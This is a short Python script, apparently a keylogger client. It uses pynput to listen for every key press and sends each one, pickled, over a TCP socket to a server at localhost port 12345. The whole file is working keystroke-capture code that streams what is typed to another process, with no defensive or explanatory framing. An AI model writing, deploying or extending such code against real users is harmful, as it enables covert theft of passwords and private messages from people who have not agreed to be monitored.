import pynput
import socket
import pickle

from pynput.keyboard import Key, Listener

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_address = ('localhost', 12345)

client_socket.connect(server_address)

def on_press(key):
    client_socket.sendall(pickle.dumps(key))

def on_release(key):
    print("release")

# def log_keys():
#     with open("")

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

client_socket.close()